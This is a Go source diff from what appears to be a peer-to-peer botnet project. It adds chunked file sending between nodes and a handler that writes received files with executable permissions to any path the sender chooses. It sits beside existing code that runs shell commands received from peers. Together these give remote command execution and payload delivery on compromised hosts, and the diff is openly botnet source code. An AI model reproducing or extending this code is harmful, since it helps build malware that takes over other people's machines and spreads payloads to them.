@@ -4,13 +4,17 @@ import (
 	"github.com/lampo100/botnet_p2p/models"
 	"github.com/lampo100/botnet_p2p/p2p_layer"
 	"log"
-	"math/rand"
 	"time"
 	"sync"
 	"os/exec"
 	"strings"
 	"unicode/utf8"
+	"os"
+	"math/rand"
+	"io"
 )
+
+const chunkSize = 128
 
 var myNode models.Node
 var pingedNodes []models.Node
@@ -24,13 +28,18 @@ var mainTerminateChannel chan struct{}
 
 var mutex = &sync.Mutex{}
 
+var filesToBeWritten map[models.UUID]*os.File
+
 func InitLayer(port uint32, terminate chan struct{}, thisTerminated chan struct{}) (bool, error) {
-	rand.Seed(time.Now().UnixNano())
 	terminateChannel = make(chan struct{})
 	mainTerminateChannel = terminate
 	hasTerminated = thisTerminated
 	nextLayerTerminated = make(chan struct{})
+
 	messagesChannel = make(chan models.Message, 16)
+	filesToBeWritten = make(map[models.UUID]*os.File)
+
+	rand.Seed(time.Now().UnixNano())
 	node, err := generateSelfNode(port)
 	if err != nil {
 		return false, err
@@ -72,9 +81,11 @@ func messageHandlerLoop() {
 			case models.Message_COMMAND:
 				go handleCommand(msg)
 				break
-			case models.Message_RESPONSE:
+			case models.Message_COMMAND_RESPONSE:
 				go handleResponse(msg)
 				break
+			case models.Message_FILE_CHUNK:
+				go handleFileChunk(msg)
 			}
 		case <-mainTerminateChannel:
 			return
@@ -97,6 +108,34 @@ func LeaveNetwork() {
 
 func SendCommand(target models.Node, command string) error {
 	return p2p_layer.Command(myNode, target, command, true)
+}
+
+func SendFile(target models.Node, path, targetPath string) error {
+	file, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	fileStat, err := file.Stat()
+	if err != nil {
+		return err
+	}
+	fileSize := fileStat.Size()
+	chunkCount := int((fileSize / chunkSize) + 1)
+	uuid := models.GenerateGUID()
+	log.Printf("[BL] File %v (UUID: %v) of size %v would be chunked into %v parts\n", path, uuid, fileSize, chunkCount)
+
+	for i := 0; i < chunkCount; i++ {
+		buffer := make([]byte, chunkSize)
+		n, err := file.ReadAt(buffer, int64(i*chunkSize))
+		if err != nil && err != io.EOF {
+			return err
+		}
+		p2p_layer.FileChunk(target, uuid, targetPath, uint32(fileSize), uint32(i), buffer[:n])
+		log.Printf("[BL] File %v (UUID: %v) chunk %v/%v(size: %v) sent\n", path, uuid, i+1, chunkCount, n)
+
+	}
+
+	return err
 }
 
 func handleFoundNodes(msg models.Message) {
@@ -149,8 +188,8 @@ func handlePingResponse(msg models.Message) {
 }
 
 func handleCommand(msg models.Message) {
-	commandString := msg.GetCommand().CommandString
-	shouldSendResponse := msg.GetCommand().SendResponse
+	commandString := msg.GetCommand().Command
+	shouldSendResponse := msg.GetCommand().ShouldRespond
 	splinted := strings.Split(commandString, " ")
 	command := splinted[0]
 	var cmd exec.Cmd
@@ -188,6 +227,31 @@ func handleResponse(msg models.Message) {
 	sender := msg.Sender.ToNode().Guid
 	response := msg.GetResponse().Value
 	log.Printf("Response from %v:\n%v\n", sender, response)
+}
+
+func handleFileChunk(msg models.Message) {
+	filePayload := msg.GetFileChunk()
+	uuid := models.GuidFromString(filePayload.Uuid)
+	number := filePayload.Ordinal
+	name := filePayload.FileName
+	size := filePayload.FileSize
+	data := filePayload.Data
+	chunks := int(size/chunkSize) + 1
+	log.Printf("[BL] Handling file %v, chunk(id: %v) %v/%v\n", uuid, number, number+1, chunks)
+
+	file, ok := filesToBeWritten[uuid]
+	if ok == false {
+		newFile, _ := os.OpenFile(name, os.O_WRONLY|os.O_CREATE, 0755)
+		file = newFile
+		filesToBeWritten[uuid] = file
+	}
+	file.WriteAt(data, int64(number*chunkSize))
+	if int(number) == chunks-1 {
+		log.Printf("[BL] Got all chunks of file %v, closing file.\n", uuid)
+		file.Close()
+		delete(filesToBeWritten, uuid)
+	}
+
 }
 
 func generateSelfNode(port uint32) (models.Node, error) {
